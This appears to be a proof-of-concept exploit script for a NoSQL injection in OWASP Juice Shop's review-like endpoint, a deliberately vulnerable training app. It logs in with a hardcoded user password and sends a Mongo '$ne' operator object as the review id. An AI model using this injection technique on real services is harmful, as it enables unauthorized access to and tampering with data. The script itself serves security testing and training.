"""NoSQL injection in routes/likeProductReviews.ts.

req.body.id is used directly as the Mongo `_id` selector in findOne/update, so an
operator object matches reviews the attacker never named by id (the noSqlReviews
class of flaws). Proof: a valid-looking but non-existent string id returns 404,
while the injected selector { $ne: <that id> } matches a real review (not 404).
Requires authentication (the endpoint is behind isAuthorized).
"""

import json
import urllib.error
import urllib.request

USER = {"email": "jim@juice-sh.op", "password": "ncc-1701"}
BOGUS = "ffffffffffffffffffffffff"


def _login(base: str) -> str:
    req = urllib.request.Request(f"{base}/rest/user/login", data=json.dumps(USER).encode(),
                                 headers={"content-type": "application/json"})
    with urllib.request.urlopen(req) as res:
        return json.load(res)["authentication"]["token"]


def _like(base: str, token: str, id_value) -> int:
    req = urllib.request.Request(f"{base}/rest/products/reviews", data=json.dumps({"id": id_value}).encode(),
                                 headers={"content-type": "application/json", "Authorization": f"Bearer {token}"})
    try:
        with urllib.request.urlopen(req) as res:
            return res.status
    except urllib.error.HTTPError as err:
        return err.code


def exploit(base: str) -> tuple[bool, str]:
    token = _login(base)
    baseline = _like(base, token, BOGUS)            # exact id: no such review
    injected = _like(base, token, {"$ne": BOGUS})   # operator: matches a review
    return baseline == 404 and injected != 404, f"baseline {baseline}, injected {injected}"
